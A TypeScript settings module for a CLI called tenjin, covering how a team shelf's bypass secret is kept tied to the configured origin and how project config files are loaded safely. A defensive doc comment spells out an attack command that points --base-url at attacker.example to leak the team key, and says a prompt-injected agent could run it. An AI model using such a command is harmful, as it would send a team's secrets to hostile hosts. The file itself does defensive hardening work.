import { execFile } from 'node:child_process';
import { readFile, stat } from 'node:fs/promises';
import { homedir } from 'node:os';
import { dirname, join } from 'node:path';
import { z } from 'zod';
import { CliError } from './errors';
import {
  CONFIG_DEFAULTS,
  PublishModeSchema,
  SEND_MAX_UNSET,
  loadRawConfig,
  resolvePublishDefaultPrice,
  resolvePublishMode,
  resolveSettings,
} from './config';
import type {
  EffectiveSettings,
  PartialConfig,
  Provenance,
  ProjectPublishLayer,
  PublishMode,
} from './config';
import type { ShelfBypass } from './http';
import { parseUsdToAtomic } from './money';
import { PRODUCTION_HOST, PRODUCTION_ORIGIN, isSameDeployment } from './production-origin';
import { parseConfirmPolicy, type SpendPolicy } from './policy';
import type { CommandContext } from '../context';

/**
 * The effective runtime settings a B2 command needs, resolved once through the
 * same precedence (flag > env > file > default) config/doctor use. Spend values
 * arrive atomic from config and are handed on as bigint for the policy layer.
 */
export interface ResolvedSettings {
  baseUrl: string;
  /** The public marketplace: the second shelf a team-mode search falls through
   *  to, and the one other origin `read`/`buy`/`inspect` will resolve against. */
  publicShelfUrl: string;
  /**
   * The team shelf's bypass secret paired with the CONFIGURED `baseUrl`'s
   * origin, or undefined in public mode and on a run whose base URL came from
   * `--base-url`/`TENJIN_BASE_URL` (see {@link resolveShelfBypass}). Handed to
   * the transport, which attaches the header from the REQUEST URL — so it cannot
   * reach `publicShelfUrl` however it is passed.
   */
  bypass?: ShelfBypass;
  /** True exactly when the door key was issued: the one switch between public
   *  mode and team mode. */
  teamMode: boolean;
  rpcUrl: string;
  policy: SpendPolicy;
  /** Search-only privacy opt-in; sends X-Tenjin-Eval-Cohort: 1 when true. */
  evalCohort: boolean;
  /** Bazaar pay lane opt-in (`tenjin pay` off the configured base URL). */
  bazaarPay: boolean;
  /** x402 discovery registries `discover` queries and the pay lane verifies against. */
  bazaarRegistries: string[];
  /**
   * Hard per-send cap for `tenjin send`: SEND_MAX_UNSET = never configured
   * (send refuses until `config set sendMaxAmount`), null = explicit "none"
   * (uncapped opt-in), 0n = disabled, otherwise the atomic cap.
   */
  sendMaxAmountAtomic: bigint | null | typeof SEND_MAX_UNSET;
}

/** `URL.origin`, or undefined for anything unparseable. */
function tryOrigin(url: string): string | undefined {
  try {
    return new URL(url).origin;
  } catch {
    return undefined;
  }
}

/**
 * The team shelf's door key, paired with the origin THE OPERATOR CONFIGURED —
 * never with the one this run happens to be pointed at.
 *
 * `shelfBypassSecret` is file-only, but `baseUrl` is not: `--base-url` and
 * `TENJIN_BASE_URL` outrank the file. Pairing the secret with the RESOLVED base
 * URL therefore let one command hand the team's key to any host that was named
 * on the command line — `tenjin search --base-url https://attacker.example "…"`
 * sends it in the first request, and the transport's origin test agrees, because
 * the pair it compares against was built from the attacker's URL. That is not a
 * hypothetical shape: `resource-ref`'s own refusal text already names a
 * task-supplied `--base-url` as the attack a prompt-injected agent runs.
 *
 * So the compare happens here, once, before the pair exists: the key is issued
 * only when the run is still pointed at the configured shelf. A run pointed
 * anywhere else gets NO pair at all, which also drops team mode — an overridden
 * base URL runs as an ordinary public-mode run, with the client scan and the
 * confirm cascade back on, rather than as a team-mode run against a stranger.
 *
 * The generated hooks need no equivalent for the flag rule: they read `baseUrl`
 * straight out of config.json and have no flag or env layer to be re-pointed
 * through. They DO carry the second rule below (`teamShelfOrigin`).
 *
 * SECOND RULE: THE TEAM SHELF MUST BE A SHELF OF ITS OWN. Team mode was keyed on
 * a non-empty secret alone, and both `baseUrl` and `publicShelfUrl` default to
 * tenjin.blog, so the two-command day-0 setup run in the other order — or the
 * secret line alone on a second machine — put a machine in "team mode" pointed
 * at the PUBLIC MARKETPLACE. Team mode is precisely the mode that skips the
 * publish scan, skips the confirm cascade and prices at 0, so under
 * `publish.mode full-auto` that misconfiguration auto-publishes internal
 * codebase notes to tenjin.blog, unscanned and unacknowledged; it also posts the
 * team's key to the public marketplace and searches one origin twice per fire.
 * A secret with no private shelf behind it is a setup that is not finished, so
 * it fails safe to public mode rather than half-on. `tenjin doctor` and
 * `config set shelfBypassSecret` say so out loud, because silence here is what
 * made the misconfiguration survivable.
 */
export function resolveShelfBypass(
  config: PartialConfig,
  s: EffectiveSettings,
): ShelfBypass | undefined {
  const secret = s.shelfBypassSecret.value;
  if (secret.length === 0) return undefined;
  const configured = tryOrigin(config.baseUrl ?? CONFIG_DEFAULTS.baseUrl);
  const effective = tryOrigin(s.baseUrl.value);
  if (configured === undefined || effective === undefined || configured !== effective) {
    return undefined;
  }
  if (!isTeamShelfOrigin(configured, s.publicShelfUrl.value)) return undefined;
  return { origin: configured, secret };
}

/**
 * Is `origin` a shelf of the team's own, as opposed to the public marketplace?
 *
 * The compare `resource-ref` already makes to no-op its second-origin allowance,
 * plus the production origin itself: a `publicShelfUrl` pointed somewhere else
 * must not make tenjin.blog read as private. `isSameDeployment` rather than `===`
 * so an alias of production (tenjin.sh) is not a loophole.
 */
export function isTeamShelfOrigin(origin: string, publicShelfUrl: string): boolean {
  if (isSameDeployment(origin, PRODUCTION_ORIGIN)) return false;
  const publicOrigin = tryOrigin(publicShelfUrl);
  return publicOrigin === undefined || !isSameDeployment(origin, publicOrigin);
}

/**
 * The host the generated hooks actually ask, for the install-time disclosure and
 * the consent prompt.
 *
 * NOT the `tenjin.blog` literal. `askTenjin` resolves its target to
 * `config.baseUrl` with no flag or env layer, so on a machine with a configured
 * shelf the base WebSearch arm asks THAT host — with the door key attached — and
 * the marketplace is not asked at all. The dispatch arm asks it first too, and
 * only falls through to the public shelf on a team miss. A disclosure naming the
 * wrong recipient is the one part of an install an operator cannot check later
 * without reading the scripts.
 *
 * Reads the raw config rather than resolved settings, because that is what the
 * scripts read: a `--base-url` on the install run reaches neither.
 */
export function hookRecipientHost(config: PartialConfig): string {
  const baseUrl = config.baseUrl ?? CONFIG_DEFAULTS.baseUrl;
  const origin = tryOrigin(baseUrl);
  if (origin === undefined) return PRODUCTION_HOST;
  const publicShelfUrl = config.publicShelfUrl ?? CONFIG_DEFAULTS.publicShelfUrl;
  if (!isTeamShelfOrigin(origin, publicShelfUrl)) return PRODUCTION_HOST;
  try {
    return new URL(baseUrl).host;
  } catch {
    return PRODUCTION_HOST;
  }
}

/** Where a close for one stored search has to go, and whether it carries the key. */
export interface ShelfRoute {
  baseUrl: string;
  bypass?: ShelfBypass;
  /** False when the entry named a shelf other than the configured `baseUrl`. */
  configured: boolean;
}

/**
 * THE SHELF THAT ANSWERED, for anything closing a loop.
 *
 * A team-mode search asks the team shelf and falls through to the public
 * marketplace, and the two have separate databases: the searchId the public leg
 * minted exists only there. Posting its outcome to the team shelf tells the team
 * shelf about a search it never ran (where it retries a parent-not-visible window
 * and then raises `outcomes_dropped_no_parent`, an alarm meant to mean a broken
 * fleet) and tells the marketplace — whose demand signal is the entire reason the
 * verb exists — nothing at all.
 *
 * `shelfBaseUrl` is absent on an entry written before it existed and on every
 * single-shelf public-mode run, and absent means the configured base, which is
 * what those entries meant.
 *
 * THE KEY RIDES THE ORIGIN, not the call site: `bypass` comes back only when the
 * route is the origin the secret was paired with. The transport re-derives the
 * same rule from the request URL ({@link shelfBypassHeaders}), so this is the
 * second of two locks rather than the only one — but a call site that reads
 * `route.bypass` should never be the place a key first goes off-origin.
 */
export function shelfRouteFor(
  stored: { shelfBaseUrl?: string } | null | undefined,
  settings: Pick<ResolvedSettings, 'baseUrl' | 'bypass'>,
): ShelfRoute {
  const recorded = stored?.shelfBaseUrl;
  const configuredOrigin = tryOrigin(settings.baseUrl);
  const recordedOrigin = recorded === undefined ? undefined : tryOrigin(recorded);
  // An unparseable record is not a second shelf, it is a corrupt field: fall back
  // to the configured base rather than posting a close nowhere.
  if (recorded === undefined || recordedOrigin === undefined) {
    return {
      baseUrl: settings.baseUrl,
      ...(settings.bypass !== undefined ? { bypass: settings.bypass } : {}),
      configured: true,
    };
  }
  const configured =
    configuredOrigin !== undefined && isSameDeployment(recordedOrigin, configuredOrigin);
  const carries = settings.bypass !== undefined && settings.bypass.origin === recordedOrigin;
  return {
    baseUrl: recorded,
    ...(carries ? { bypass: settings.bypass } : {}),
    configured,
  };
}

export async function resolveContextSettings(ctx: CommandContext): Promise<ResolvedSettings> {
  const config = await loadRawConfig(ctx.dataDir);
  const s = resolveSettings({ config, flags: { baseUrl: ctx.flags.baseUrl }, env: process.env });
  // Paired with the origin here, once, so no command has to remember to.
  const bypass = resolveShelfBypass(config, s);
  return {
    baseUrl: s.baseUrl.value,
    publicShelfUrl: s.publicShelfUrl.value,
    ...(bypass !== undefined ? { bypass } : {}),
    teamMode: bypass !== undefined,
    rpcUrl: s.rpcUrl.value,
    evalCohort: s.evalCohort.value,
    bazaarPay: s.bazaarPay.value,
    bazaarRegistries: s.bazaarRegistries.value,
    sendMaxAmountAtomic:
      s.sendMaxAmount.value === SEND_MAX_UNSET
        ? SEND_MAX_UNSET
        : s.sendMaxAmount.value === 'none'
          ? null
          : BigInt(s.sendMaxAmount.value),
    policy: {
      maxAutoSpendAtomic: BigInt(s.maxAutoSpend.value),
      sessionBudgetAtomic: BigInt(s.sessionBudget.value),
      confirm: parseConfirmPolicy(s.confirm.value),
      allowlistCreators: s.allowlistCreators.value,
    },
  };
}

// ---------------------------------------------------------------------------
// Publish consent settings (B3, D38)
//
// The publish mode/price cascade extends the same precedence machinery
// (resolvePublishMode / resolvePublishDefaultPrice in lib/config) with a
// per-project layer that needs I/O the pure resolvers can't do: it walks up from
// cwd for a `.tenjin.json` and asks git whether that file is committed (the
// loosening gate on `full-auto`). It lives here beside resolveContextSettings so
// there is one settings resolver, not a parallel one.
// ---------------------------------------------------------------------------

export const PROJECT_CONFIG_FILE = '.tenjin.json';

/**
 * The per-project override file. `publish.defaultPrice` is DECIMAL USD ("0.10"),
 * because a hand-edited project file is a human edge (O1) — unlike config.json,
 * which stores atomic because `config set` converts at the command edge. The
 * decimal string is converted to atomic at load via the same money util the
 * config command uses. Partial + passthrough: forward-compatible with subkeys a
 * newer CLI adds, same posture as the global config.
 */
const ProjectConfigSchema = z
  .object({
    publish: z
      .object({
        mode: PublishModeSchema.optional(),
        defaultPrice: z.string().optional(),
      })
      .passthrough()
      .optional(),
  })
  .passthrough();

export interface LoadedProjectConfig {
  /** Absolute path of the discovered `.tenjin.json`. */
  path: string;
  layer: ProjectPublishLayer;
}

export interface PublishSettingsDeps {
  /** git check-ignore seam; defaults to shelling out to git (see wallet/passphrase). */
  isGitignored?: (filePath: string) => Promise<boolean>;
  /** Ownership seam; defaults to stat().uid vs process uid. Gates a planted file. */
  isForeignOwned?: (filePath: string) => Promise<boolean>;
  /** One-line stderr warning sink; defaults to process.stderr. */
  warn?: (message: string) => void;
  /** Upper bound of the walk; defaults to the user's home directory. */
  homeDir?: string;
}

export interface ResolvedPublishSettings {
  mode: PublishMode;
  modeSource: Provenance;
  defaultPriceAtomic: string;
  defaultPriceSource: Provenance;
  /** Non-fatal notices for stderr (e.g. the full-auto downgrade). */
  warnings: string[];
  /** The `.tenjin.json` that contributed the project layer, if one was found. */
  projectConfigPath?: string;
}

/**
 * Resolve the effective publish mode + default price across every layer:
 * global config.json < project `.tenjin.json` < env (TENJIN_PUBLISH_MODE) <
 * flag (`--mode`), with the `full-auto` loosening gate applied to the project
 * layer. The seam a `publish` command (B3.2) resolves its consent through.
 */
export async function resolvePublishSettings(
  input: { dataDir: string; cwd: string; flag?: string; env?: NodeJS.ProcessEnv },
  deps: PublishSettingsDeps = {},
): Promise<ResolvedPublishSettings> {
  const env = input.env ?? process.env;
  const config = await loadRawConfig(input.dataDir);
  const project = await loadProjectConfig(input.cwd, deps);
  const layer = project?.layer;

  const mode = resolvePublishMode({ config, project: layer, env, flag: input.flag });
  const price = resolvePublishDefaultPrice({ config, project: layer });
  const warnings = mode.downgradedWarning !== undefined ? [mode.downgradedWarning] : [];

  return {
    mode: mode.value,
    modeSource: mode.source,
    defaultPriceAtomic: price.value,
    defaultPriceSource: price.source,
    warnings,
    ...(project !== null ? { projectConfigPath: project.path } : {}),
  };
}

/**
 * Find the nearest `.tenjin.json` walking up from cwd toward the repo root (the
 * first directory holding a `.git`, inclusive), never crossing above $HOME, then
 * load, validate, and check whether it is gitignored. A file not owned by the
 * current user is ignored with a stderr warning (a planted config on a shared
 * host must not become the honored project layer). Null when none is found; a
 * present-but-unreadable/malformed file is CONFIG_INVALID (never silently
 * skipped).
 */
export async function loadProjectConfig(
  cwd: string,
  deps: PublishSettingsDeps = {},
): Promise<LoadedProjectConfig | null> {
  const path = await findProjectConfigFile(cwd, deps);
  if (path === null) return null;

  let json: unknown;
  try {
    // readFile is inside the try: a raced delete (ENOENT), a directory named
    // .tenjin.json (EISDIR), or a permission error (EACCES) is a bad project file,
    // not an INTERNAL fault.
    json = JSON.parse(await readFile(path, 'utf8'));
  } catch (err) {
    throw new CliError('CONFIG_INVALID', `${PROJECT_CONFIG_FILE} at ${path} could not be read`, {
      fix: `Fix or delete ${path} (must be a readable JSON file).`,
      cause: err,
    });
  }
  const parsed = ProjectConfigSchema.safeParse(json);
  if (!parsed.success) {
    throw new CliError('CONFIG_INVALID', `${PROJECT_CONFIG_FILE} at ${path} is invalid`, {
      fix: `Correct the reported keys in ${path}, or delete it.`,
      details: parsed.error.issues,
    });
  }

  const isGitignored = deps.isGitignored ?? defaultIsGitignored;
  const gitignored = await isGitignored(path);
  const layer: ProjectPublishLayer = { gitignored };
  if (parsed.data.publish !== undefined) {
    const { mode, defaultPrice } = parsed.data.publish;
    layer.publish = {
      ...(mode !== undefined ? { mode } : {}),
      ...(defaultPrice !== undefined
        ? { defaultPrice: parseProjectPrice(defaultPrice, path) }
        : {}),
    };
  }
  return { path, layer };
}

/**
 * Convert a `.tenjin.json` decimal-USD price to atomic via the shared money
 * parser. parseUsdToAtomic throws USAGE on a bad amount; re-raise as
 * CONFIG_INVALID naming the file, so it reads like the file's other errors.
 */
function parseProjectPrice(decimalUsd: string, path: string): string {
  try {
    return parseUsdToAtomic(decimalUsd);
  } catch (err) {
    throw new CliError(
      'CONFIG_INVALID',
      `${PROJECT_CONFIG_FILE} at ${path} has an invalid publish.defaultPrice`,
      { fix: 'Use a non-negative decimal USD amount like "0.10".', cause: err },
    );
  }
}

async function findProjectConfigFile(
  cwd: string,
  deps: PublishSettingsDeps,
): Promise<string | null> {
  const homeDir = deps.homeDir ?? homedir();
  const isForeignOwned = deps.isForeignOwned ?? defaultIsForeignOwned;
  const warn = deps.warn ?? ((message: string) => process.stderr.write(`${message}\n`));

  let dir = cwd;
  // Bounded by $HOME (a shared-host trust boundary) and the filesystem root
  // (dirname('/') === '/'), whichever comes first.
  for (;;) {
    const candidate = join(dir, PROJECT_CONFIG_FILE);
    if (await pathExists(candidate)) {
      if (await isForeignOwned(candidate)) {
        // A file owned by another user (e.g. /tmp/.tenjin.json on a shared box)
        // must never become the honored layer; skip it and keep walking.
        warn(`Ignoring ${candidate}: not owned by the current user.`);
      } else {
        return candidate;
      }
    }
    if (await pathExists(join(dir, '.git'))) return null; // repo root, no file
    if (dir === homeDir) return null; // never cross above $HOME
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
}

/**
 * True when the file is owned by a different uid than the process. On a platform
 * without a uid model (Windows: process.getuid is undefined) this is always
 * false — the ownership gate is a POSIX shared-host protection.
 */
async function defaultIsForeignOwned(filePath: string): Promise<boolean> {
  const uid = process.getuid?.();
  if (uid === undefined) return false;
  try {
    return (await stat(filePath)).uid !== uid;
  } catch {
    return false;
  }
}

/** True when a path exists (of any type). Shared with the candidate command's
 *  repo-root walk so the two `.git`/file probes stay one implementation. */
export async function pathExists(path: string): Promise<boolean> {
  try {
    await stat(path);
    return true;
  } catch {
    return false;
  }
}

/**
 * True only on a git check-ignore exit 0 (the path is ignored). Exit 1 (tracked)
 * and any error (git absent, not a repo) resolve false: `full-auto` is honored
 * from a project file ONLY when git positively confirms it is ignored. Uses
 * execFile with an argv array (never a shell), matching wallet/passphrase.ts.
 */
function defaultIsGitignored(filePath: string): Promise<boolean> {
  return new Promise((resolve) => {
    execFile(
      'git',
      ['check-ignore', '--quiet', '--', filePath],
      { cwd: dirname(filePath) },
      (err) => resolve(err === null),
    );
  });
}
